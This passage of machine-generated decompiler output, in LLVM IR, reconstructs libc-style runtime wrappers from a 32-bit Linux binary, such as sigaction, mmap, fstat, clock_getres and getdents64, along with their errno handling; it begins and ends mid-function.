dec_label_pc_805221d:                             ; preds = %dec_label_pc_80521ce
  br label %dec_label_pc_8052233

dec_label_pc_8052233:                             ; preds = %dec_label_pc_805221d, %dec_label_pc_8052204, %dec_label_pc_80521f4
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_805223a = call i32 @function_80520cb()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8052249 = call i32 @function_80520cb()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8052258 = call i32 @function_80520cb()
  br label %dec_label_pc_805225d

dec_label_pc_805225d:                             ; preds = %dec_label_pc_8052204, %dec_label_pc_8052233
  store i32 ptrtoint (i32* @global_var_80542a4.58 to i32), i32* %esi.global-to-local, align 4
  %v0_8052262 = load i32, i32* @edi, align 4
  %v1_8052262 = inttoptr i32 %v0_8052262 to i32*
  %v2_8052262 = load i32, i32* %v1_8052262, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_80542a4.58 to i32), i32 -134562468), i32* %esi.global-to-local, align 4
  store i32 %v2_8052262, i32* inttoptr (i32 134562600 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_80542a4.58 to i32), i32 -134562468), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_80543e8.60, align 8
  br i1 icmp ult (i32 add (i32 ptrtoint (i32* @global_var_80542a4.58 to i32), i32 -134562465), i32 7), label %dec_label_pc_805228e, label %dec_label_pc_8052282

dec_label_pc_8052282:                             ; preds = %dec_label_pc_805225d, %dec_label_pc_8052282
  %v4_8052282 = phi i32 [ %v1_8052289, %dec_label_pc_8052282 ], [ 0, %dec_label_pc_805225d ]
  store i32 ptrtoint (i32* @global_var_8052289.69 to i32), i32* %stack_var_-160, align 4
  %v5_8052282 = mul i32 %v4_8052282, 4
  %v6_8052282 = add i32 %v5_8052282, ptrtoint (i32* @global_var_80542a4.58 to i32)
  %v7_8052282 = inttoptr i32 %v6_8052282 to i32*
  %v8_8052282 = load i32, i32* %v7_8052282, align 4
  call void @__pseudo_call(i32 %v8_8052282)
  %v0_8052289 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052289 = add i32 %v0_8052289, 1
  store i32 %v1_8052289, i32* %ebx.global-to-local, align 4
  %v1_805228a = load i32, i32* %esi.global-to-local, align 4
  %v7_805228a = icmp ult i32 %v1_8052289, %v1_805228a
  br i1 %v7_805228a, label %dec_label_pc_8052282, label %dec_label_pc_805228e

dec_label_pc_805228e:                             ; preds = %dec_label_pc_8052282, %dec_label_pc_805225d
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80542a4.58 to i32), i32 -134562468), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80542a4.58 to i32), i32 -134562468), i32 2), i32 0), label %dec_label_pc_80522a6, label %dec_label_pc_80522b2

dec_label_pc_80522a6:                             ; preds = %dec_label_pc_805228e, %dec_label_pc_80522a6
  %v4_80522a6 = phi i32 [ %v1_80522ad, %dec_label_pc_80522a6 ], [ 0, %dec_label_pc_805228e ]
  store i32 ptrtoint (i32* @global_var_80522ad.70 to i32), i32* %stack_var_-160, align 4
  %v5_80522a6 = mul i32 %v4_80522a6, 4
  %v6_80522a6 = add i32 %v5_80522a6, ptrtoint (i32* @global_var_80542a4.58 to i32)
  %v7_80522a6 = inttoptr i32 %v6_80522a6 to i32*
  %v8_80522a6 = load i32, i32* %v7_80522a6, align 4
  call void @__pseudo_call(i32 %v8_80522a6)
  %v0_80522ad = load i32, i32* %ebx.global-to-local, align 4
  %v1_80522ad = add i32 %v0_80522ad, 1
  store i32 %v1_80522ad, i32* %ebx.global-to-local, align 4
  %v1_80522ae = load i32, i32* %esi.global-to-local, align 4
  %v7_80522ae = icmp ult i32 %v1_80522ad, %v1_80522ae
  br i1 %v7_80522ae, label %dec_label_pc_80522a6, label %dec_label_pc_80522b2

dec_label_pc_80522b2:                             ; preds = %dec_label_pc_80522a6, %dec_label_pc_805228e
  %v0_80522bb = load i32, i32* %stack_var_-160, align 4
  %v1_80522bb = call i32 @function_805076b(i32 %v0_80522bb)
  %v1_80522c0 = inttoptr i32 %v1_80522bb to i32*
  store i32 0, i32* %v1_80522c0, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v0_80522e1 = load i32, i32* @edi, align 4
  store i32 %v0_80522e1, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_80522f0 = load i32, i32* @eax, align 4
  %v1_80522f3 = call i32 @function_8051d53(i32 %v0_80522f0)
  %v0_80522fd = load i32, i32* @ebx, align 4
  %v1_80522fd = inttoptr i32 %v0_80522fd to %sigcontext*
  %v2_80522fd = call i32 @sigreturn(%sigcontext* %v1_80522fd)
  %v0_8052305 = load i32, i32* @ebx, align 4
  %v1_8052305 = inttoptr i32 %v0_8052305 to %sigcontext*
  %v2_8052305 = call i32 @sigreturn(%sigcontext* %v1_8052305)
  ret i32 %v2_8052305

; uselistorder directives
  uselistorder i32 %v1_80522ad, { 1, 2, 0 }
  uselistorder i32 %v1_8052289, { 1, 2, 0 }
  uselistorder i32 %v2_80521c9, { 1, 0 }
  uselistorder i32 %v1_80521c6, { 2, 1, 0 }
  uselistorder i32 %v1_80521a5, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80521a2, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @function_8051d53, { 0, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80542a4.58 to i32), i32 -134562468), i32 2), { 1, 3, 2, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80542a4.58 to i32), i32 -134562468), { 0, 2, 1 }
  uselistorder i32 ()* @function_80520cb, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 9, 0, 1, 7, 8, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80522a6, { 1, 0 }
  uselistorder label %dec_label_pc_8052282, { 1, 0 }
  uselistorder label %dec_label_pc_805225d, { 1, 0 }
  uselistorder label %dec_label_pc_80521c6, { 1, 0 }
  uselistorder label %dec_label_pc_80521ae, { 1, 0 }
}

define i32 @function_8052307(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052307:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8052307 = load i32, i32* @esi, align 4
  %v0_8052308 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805231d = icmp eq i32* %arg2, null
  br i1 %v1_805231d, label %dec_label_pc_8052307.dec_label_pc_8052370_crit_edge, label %dec_label_pc_8052321

dec_label_pc_8052307.dec_label_pc_8052370_crit_edge: ; preds = %dec_label_pc_8052307
  br label %dec_label_pc_8052370

dec_label_pc_8052321:                             ; preds = %dec_label_pc_8052307
  %v2_8052321 = load i32, i32* %arg2, align 4
  store i32 %v2_8052321, i32* %stack_var_-148, align 4
  %v1_805232a = add i32 %tmp11, 4
  %v3_805233c = bitcast i32* %stack_var_-136 to i16*
  %v4_805233c = call i32 @function_805298a(i16* %v3_805233c, i32 %v1_805232a, i32 128)
  br label %dec_label_pc_8052370

dec_label_pc_8052370:                             ; preds = %dec_label_pc_8052307.dec_label_pc_8052370_crit_edge, %dec_label_pc_8052321
  %v1_8052372 = icmp eq i32 %arg3, 0
  %v2_8052376 = ptrtoint i32* %stack_var_-288 to i32
  %.v2_8052376 = select i1 %v1_8052372, i32 0, i32 %v2_8052376
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  %v0_805238a = select i1 %v1_805231d, %sigaction* null, %sigaction* %phitmp
  %v5_8052392 = call i32 @function_805242d(i32 %arg1, %sigaction* %v0_805238a, i32 %.v2_8052376, i32 8)
  store i32 %v5_8052392, i32* %ebx.global-to-local, align 4
  %v2_80523a0 = icmp slt i32 %v5_8052392, 0
  %or.cond = or i1 %v1_8052372, %v2_80523a0
  br i1 %or.cond, label %dec_label_pc_80523d5, label %dec_label_pc_80523a4

dec_label_pc_80523a4:                             ; preds = %dec_label_pc_8052370
  %v3_80523a4 = load i32, i32* %stack_var_-288, align 4
  %v2_80523a8 = inttoptr i32 %arg3 to i32*
  store i32 %v3_80523a4, i32* %v2_80523a8, align 4
  %v2_80523b0 = ptrtoint i32* %stack_var_-276 to i32
  %v1_80523b5 = add i32 %arg3, 4
  %v3_80523b9 = inttoptr i32 %v1_80523b5 to i16*
  %v4_80523b9 = call i32 @function_805298a(i16* %v3_80523b9, i32 %v2_80523b0, i32 128)
  %v2_80523c2 = add i32 %arg3, 132
  %v3_80523c2 = inttoptr i32 %v2_80523c2 to i32*
  %v2_80523cf = add i32 %arg3, 136
  %v3_80523cf = inttoptr i32 %v2_80523cf to i32*
  %v0_80523d5.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80523d5

dec_label_pc_80523d5:                             ; preds = %dec_label_pc_8052370, %dec_label_pc_80523a4
  %v0_80523d5 = phi i32 [ %v5_8052392, %dec_label_pc_8052370 ], [ %v0_80523d5.pre, %dec_label_pc_80523a4 ]
  store i32 %v0_8052308, i32* @ebx, align 4
  store i32 %v0_8052307, i32* @esi, align 4
  ret i32 %v0_80523d5

; uselistorder directives
  uselistorder i32 128, { 0, 1, 3, 2 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_80523d5, { 1, 0 }
  uselistorder label %dec_label_pc_8052370, { 1, 0 }
}

define i32 @function_80523e0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_80523e0:
  %stack_var_4 = alloca i32, align 4
  %v0_80523e0 = load i32, i32* @ebx, align 4
  store i32 %v0_80523e0, i32* @edx, align 4
  %v2_80523eb = load i32, i32* @ecx, align 4
  %v4_80523eb = load i32, i32* @esi, align 4
  %v5_80523eb = load i32, i32* @edi, align 4
  %v6_80523eb = load i32, i32* @ebp, align 4
  %v7_80523eb = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_80523eb, i32 %v0_80523e0, i32 %v4_80523eb, i32 %v5_80523eb, i32 %v6_80523eb)
  %v8_80523eb = ptrtoint i32* %v7_80523eb to i32
  store i32 %v0_80523e0, i32* @ebx, align 4
  %v3_80523f4 = icmp ugt i32* %v7_80523eb, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_80523f4, i32 134556325)
  ret i32 %v8_80523eb

; uselistorder directives
  uselistorder i32* @ebp, { 2, 49, 50, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 24, 20, 21, 22, 23, 1, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 46, 47, 48, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32* @ecx, { 3, 37, 34, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 24, 25, 26, 1, 27, 36, 35, 29, 30, 2, 31, 32, 28, 33, 38 }
}

define i32 @function_80523fb(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80523fb:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80523fb = load i32, i32* @ebx, align 4
  store i32 %v0_80523fb, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805240e = call i32 @int80_syscall(i32 102)
  store i32 %v1_805240e, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_805240e, -4095
  br i1 %tmp9, label %dec_label_pc_8052427, label %dec_label_pc_805241b

dec_label_pc_805241b:                             ; preds = %dec_label_pc_80523fb
  %v1_805241b = call i32 @function_805076b(i32 %v0_80523fb)
  %v0_8052420 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052420 = sub i32 0, %v0_8052420
  %v2_8052422 = inttoptr i32 %v1_805241b to i32*
  store i32 %v1_8052420, i32* %v2_8052422, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805242b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052427

dec_label_pc_8052427:                             ; preds = %dec_label_pc_80523fb, %dec_label_pc_805241b
  %v2_805242b = phi i32 [ %v0_80523fb, %dec_label_pc_80523fb ], [ %v2_805242b.pre, %dec_label_pc_805241b ]
  %v0_8052427 = phi i32 [ %v1_805240e, %dec_label_pc_80523fb ], [ -1, %dec_label_pc_805241b ]
  %v2_8052429 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052429, i32* @edx, align 4
  store i32 %v2_805242b, i32* @ebx, align 4
  ret i32 %v0_8052427

; uselistorder directives
  uselistorder i32 %v1_805240e, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052427, { 1, 0 }
}

define i32 @function_805242d(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805242d:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_805242e = load i32, i32* @esi, align 4
  store i32 %v0_805242e, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8052442 = load i32, i32* @ebx, align 4
  %v7_805244a = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_805244a, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_805244a, -4095
  br i1 %tmp14, label %dec_label_pc_8052462, label %dec_label_pc_8052456

dec_label_pc_8052456:                             ; preds = %dec_label_pc_805242d
  %v1_8052456 = call i32 @function_805076b(i32 %v0_8052442)
  %v0_805245b = load i32, i32* %esi.global-to-local, align 4
  %v1_805245b = sub i32 0, %v0_805245b
  %v2_805245d = inttoptr i32 %v1_8052456 to i32*
  store i32 %v1_805245b, i32* %v2_805245d, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052465.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052462

dec_label_pc_8052462:                             ; preds = %dec_label_pc_805242d, %dec_label_pc_8052456
  %v2_8052465 = phi i32 [ %v0_805242e, %dec_label_pc_805242d ], [ %v2_8052465.pre, %dec_label_pc_8052456 ]
  %v0_8052462 = phi i32 [ %v7_805244a, %dec_label_pc_805242d ], [ -1, %dec_label_pc_8052456 ]
  store i32 %v2_8052465, i32* @esi, align 4
  ret i32 %v0_8052462

; uselistorder directives
  uselistorder i32 %v7_805244a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052462, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_8052468(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_8052468:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_8052490(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052490:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052490 = load i32, i32* @ebx, align 4
  store i32 %v0_8052490, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_80524a3 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_80524a3, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_80524a3, -4095
  br i1 %tmp10, label %dec_label_pc_80524bc, label %dec_label_pc_80524b0

dec_label_pc_80524b0:                             ; preds = %dec_label_pc_8052490
  %v1_80524b0 = call i32 @function_805076b(i32 %v0_8052490)
  %v0_80524b5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80524b5 = sub i32 0, %v0_80524b5
  %v2_80524b7 = inttoptr i32 %v1_80524b0 to i32*
  store i32 %v1_80524b5, i32* %v2_80524b7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80524c0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80524bc

dec_label_pc_80524bc:                             ; preds = %dec_label_pc_8052490, %dec_label_pc_80524b0
  %v2_80524c0 = phi i32 [ %v0_8052490, %dec_label_pc_8052490 ], [ %v2_80524c0.pre, %dec_label_pc_80524b0 ]
  %v0_80524bc = phi i32 [ %v4_80524a3, %dec_label_pc_8052490 ], [ -1, %dec_label_pc_80524b0 ]
  %v2_80524be = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80524be, i32* @edx, align 4
  store i32 %v2_80524c0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80524bc

; uselistorder directives
  uselistorder i32 %v4_80524a3, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80524bc, { 1, 0 }
}

define i32 @function_80524c2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80524c2:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80524c2 = load i32, i32* @ebx, align 4
  store i32 %v0_80524c2, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_80524d5 = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_80524d5, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_80524d5, -4095
  br i1 %tmp13, label %dec_label_pc_80524f0, label %dec_label_pc_80524e2

dec_label_pc_80524e2:                             ; preds = %dec_label_pc_80524c2
  %v1_80524e2 = call i32 @function_805076b(i32 %v0_80524c2)
  %v0_80524e7 = load i32, i32* @ebx, align 4
  %v1_80524e7 = sub i32 0, %v0_80524e7
  %v2_80524e9 = inttoptr i32 %v1_80524e2 to i32*
  store i32 %v1_80524e7, i32* %v2_80524e9, align 4
  %v2_8052508.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052503

dec_label_pc_80524f0:                             ; preds = %dec_label_pc_80524c2
  %v1_80524f0 = icmp eq i32 %v4_80524d5, 0
  %v1_80524f2 = icmp eq i1 %v1_80524f0, false
  br i1 %v1_80524f2, label %dec_label_pc_8052503, label %dec_label_pc_80524f4

dec_label_pc_80524f4:                             ; preds = %dec_label_pc_80524f0
  %v4_80524fb = bitcast i32* %stack_var_-68 to i16*
  %v5_80524fb = call i32 @function_805290d(i16* %v4_80524fb, i32 %arg2, i32 %v4_80524d5, i32 %v4_80524d5)
  %v0_8052503.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052503

dec_label_pc_8052503:                             ; preds = %dec_label_pc_80524f0, %dec_label_pc_80524e2, %dec_label_pc_80524f4
  %v2_8052508 = phi i32 [ %v0_80524c2, %dec_label_pc_80524f0 ], [ %v2_8052508.pre, %dec_label_pc_80524e2 ], [ %v0_80524c2, %dec_label_pc_80524f4 ]
  %v0_8052503 = phi i32 [ %v4_80524d5, %dec_label_pc_80524f0 ], [ -1, %dec_label_pc_80524e2 ], [ %v0_8052503.pre, %dec_label_pc_80524f4 ]
  store i32 %v2_8052508, i32* @ebx, align 4
  ret i32 %v0_8052503

; uselistorder directives
  uselistorder i32 %v4_80524d5, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8052503, { 2, 0, 1 }
}

define i32 @function_805250a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805250a:
  %eax.global-to-local = alloca i32, align 4
  %v0_805250a = load i32, i32* @edi, align 4
  %v0_805250b = load i32, i32* @esi, align 4
  %v0_805250c = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8052511 = load i32, i32* @edx, align 4
  %v7_805251b = inttoptr i32 %arg2 to i32*
  %v8_805251b = call i32 @function_8052579(i32 %arg1, i32* %v7_805251b, i32 %arg3, i32 %v0_8052511, i32 %v0_805250c, i32 %v0_805250b, i32 %v0_805250a)
  store i32 %v8_805251b, i32* %eax.global-to-local, align 4
  store i32 %v8_805251b, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_805251b, 1
  br i1 %tmp24, label %dec_label_pc_8052573, label %dec_label_pc_8052529

dec_label_pc_8052529:                             ; preds = %dec_label_pc_805250a
  %v0_8052529 = load i32, i32* @ebx, align 4
  %v2_8052529 = add i32 %v0_8052529, %v8_805251b
  store i32 %v2_8052529, i32* @edi, align 4
  %v7_805256f4 = icmp ult i32 %v0_8052529, %v2_8052529
  br i1 %v7_805256f4, label %dec_label_pc_805252e, label %dec_label_pc_8052573

dec_label_pc_805252e:                             ; preds = %dec_label_pc_8052529, %dec_label_pc_805252e
  %v0_805252e = phi i32 [ %v2_805256d, %dec_label_pc_805252e ], [ %v0_8052529, %dec_label_pc_8052529 ]
  %v1_805252e = add i32 %v0_805252e, 8
  %v2_805252e = inttoptr i32 %v1_805252e to i32*
  %v3_805252e = load i32, i32* %v2_805252e, align 4
  store i32 %v3_805252e, i32* %eax.global-to-local, align 4
  %v2_8052531 = add i32 %v0_805252e, 4
  %v3_8052531 = inttoptr i32 %v2_8052531 to i32*
  store i32 %v3_805252e, i32* %v3_8052531, align 4
  %v0_8052534 = load i32, i32* @ebx, align 4
  %v1_8052534 = add i32 %v0_8052534, 16
  %v2_8052534 = inttoptr i32 %v1_8052534 to i32*
  %v3_8052534 = load i32, i32* %v2_8052534, align 4
  store i32 %v3_8052534, i32* %eax.global-to-local, align 4
  %v1_8052537 = trunc i32 %v3_8052534 to i16
  %v3_8052537 = add i32 %v0_8052534, 8
  %v4_8052537 = inttoptr i32 %v3_8052537 to i16*
  store i16 %v1_8052537, i16* %v4_8052537, align 2
  %v0_805253b = load i32, i32* @ebx, align 4
  %v1_805253b = add i32 %v0_805253b, 18
  %v2_805253b = inttoptr i32 %v1_805253b to i8*
  %v3_805253b = load i8, i8* %v2_805253b, align 1
  %v4_805253b = zext i8 %v3_805253b to i32
  %v5_805253b = load i32, i32* %eax.global-to-local, align 4
  %v6_805253b = and i32 %v5_805253b, -256
  %v7_805253b = or i32 %v6_805253b, %v4_805253b
  store i32 %v7_805253b, i32* %eax.global-to-local, align 4
  %v3_805253e = add i32 %v0_805253b, 10
  %v4_805253e = inttoptr i32 %v3_805253e to i8*
  store i8 %v3_805253b, i8* %v4_805253e, align 1
  %v0_8052542 = load i32, i32* @ebx, align 4
  %v1_8052542 = add i32 %v0_8052542, 8
  %v2_8052542 = inttoptr i32 %v1_8052542 to i16*
  %v3_8052542 = load i16, i16* %v2_8052542, align 2
  %v4_8052542 = zext i16 %v3_8052542 to i32
  %v1_8052546 = add nsw i32 %v4_8052542, -19
  %v1_805254a = add i32 %v0_8052542, 19
  %v1_805254e = add i32 %v0_8052542, 11
  store i32 %v1_805254e, i32* %eax.global-to-local, align 4
  %v3_8052552 = inttoptr i32 %v1_805254e to i8*
  %v4_8052552 = call i32 @function_8050795(i8* %v3_8052552, i32 %v1_805254a, i32 %v1_8052546)
  store i32 %v4_8052552, i32* %eax.global-to-local, align 4
  %v0_805255a = load i32, i32* @ebx, align 4
  %v1_805255a = add i32 %v0_805255a, 8
  %v2_805255a = inttoptr i32 %v1_805255a to i16*
  %v3_805255a = load i16, i16* %v2_805255a, align 2
  %v4_805255a = zext i16 %v3_805255a to i32
  store i32 %v4_805255a, i32* %eax.global-to-local, align 4
  %v3_8052561 = inttoptr i32 %v0_805255a to i8*
  %v4_8052561 = call i32 @function_8050795(i8* %v3_8052561, i32 %v0_805255a, i32 %v4_805255a)
  store i32 %v4_8052561, i32* %eax.global-to-local, align 4
  %v0_8052566 = load i32, i32* @ebx, align 4
  %v1_8052566 = add i32 %v0_8052566, 8
  %v2_8052566 = inttoptr i32 %v1_8052566 to i16*
  %v3_8052566 = load i16, i16* %v2_8052566, align 2
  %v4_8052566 = zext i16 %v3_8052566 to i32
  store i32 %v4_8052566, i32* %eax.global-to-local, align 4
  %v2_805256d = add i32 %v4_8052566, %v0_8052566
  store i32 %v2_805256d, i32* @ebx, align 4
  %v1_805256f = load i32, i32* @edi, align 4
  %v7_805256f = icmp ult i32 %v2_805256d, %v1_805256f
  br i1 %v7_805256f, label %dec_label_pc_805252e, label %dec_label_pc_805256f.dec_label_pc_8052573.loopexit_crit_edge

dec_label_pc_805256f.dec_label_pc_8052573.loopexit_crit_edge: ; preds = %dec_label_pc_805252e
  %v0_8052573.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052573

dec_label_pc_8052573:                             ; preds = %dec_label_pc_8052529, %dec_label_pc_805256f.dec_label_pc_8052573.loopexit_crit_edge, %dec_label_pc_805250a
  %v0_8052573 = phi i32 [ %v8_805251b, %dec_label_pc_805250a ], [ %v0_8052573.pre.pre, %dec_label_pc_805256f.dec_label_pc_8052573.loopexit_crit_edge ], [ %v8_805251b, %dec_label_pc_8052529 ]
  store i32 %v0_8052573, i32* %eax.global-to-local, align 4
  store i32 %v0_805250b, i32* @esi, align 4
  store i32 %v0_805250a, i32* @edi, align 4
  ret i32 %v0_8052573

; uselistorder directives
  uselistorder i32 %v0_8052573, { 1, 0 }
  uselistorder i32 %v2_805256d, { 1, 2, 0 }
  uselistorder i32 %v0_805255a, { 1, 0, 2 }
  uselistorder i32 %v0_8052542, { 1, 0, 2 }
  uselistorder i32 %v0_805252e, { 1, 0 }
  uselistorder i32 %v0_8052529, { 0, 2, 1 }
  uselistorder i32 %v8_805251b, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32, i32)* @function_8050795, { 0, 1, 3, 2 }
  uselistorder i32 11, { 4, 3, 5, 6, 2, 0, 1 }
  uselistorder label %dec_label_pc_8052573, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805252e, { 1, 0 }
}

define i32 @function_8052579(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8052579:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_805257c = load i32, i32* @edi, align 4
  %v0_805257e = load i32, i32* @ebx, align 4
  %v15_805257f = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_8052588 = add i32 %arg3, 30
  %v1_805258e = and i32 %v1_8052588, -16
  %v2_8052591 = sub i32 %v15_805257f, %v1_805258e
  %v1_8052593 = add i32 %v2_8052591, 15
  %v1_8052597 = and i32 %v1_8052593, -16
  %v1_805259d = inttoptr i32 %v1_8052597 to %linux_dirent64*
  store i32 %v1_8052597, i32* %ecx.global-to-local, align 4
  %v2_805259f = add i32 %v2_8052591, -4
  %v3_805259f = inttoptr i32 %v2_805259f to i32*
  store i32 %v0_805257e, i32* %v3_805259f, align 4
  %v0_80525a0 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_80525a7 = call i32 @getdents64(i32 %v0_80525a0, %linux_dirent64* %v1_805259d, i32 %arg3)
  store i32 %v5_80525a7, i32* %eax.global-to-local, align 4
  %v0_80525a9 = load i32, i32* @esp, align 4
  %v3_80525a9 = add i32 %v0_80525a9, 4
  %tmp39 = icmp ult i32 %v5_80525a7, -4095
  br i1 %tmp39, label %dec_label_pc_80525c9, label %dec_label_pc_80525b4

dec_label_pc_80525b4:                             ; preds = %dec_label_pc_8052579
  %v1_80525b4 = call i32 @function_805076b(i32 %v5_80525a7)
  store i32 %v1_80525b4, i32* %eax.global-to-local, align 4
  %v4_80525b9 = sub i32 0, %v5_80525a7
  %v2_80525bf = inttoptr i32 %v1_80525b4 to i32*
  store i32 %v4_80525b9, i32* %v2_80525bf, align 4
  br label %dec_label_pc_8052685

dec_label_pc_80525c9:                             ; preds = %dec_label_pc_8052579
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_8052597, i32* @ebx, align 4
  %v5_8052675 = add i32 %v5_80525a7, %v1_8052597
  store i32 %v5_8052675, i32* %eax.global-to-local, align 4
  %v7_805267829 = icmp ult i32 %v1_8052597, %v5_8052675
  br i1 %v7_805267829, label %dec_label_pc_80525e2.lr.ph, label %dec_label_pc_8052680

dec_label_pc_80525e2.lr.ph:                       ; preds = %dec_label_pc_80525c9
  %v5_80525ef = add i32 %tmp14, %arg3
  br label %dec_label_pc_80525e2

dec_label_pc_80525e2:                             ; preds = %dec_label_pc_80525e2.lr.ph, %dec_label_pc_8052624
  %stack_var_-32.034 = phi i32 [ -1, %dec_label_pc_80525e2.lr.ph ], [ %v3_8052627, %dec_label_pc_8052624 ]
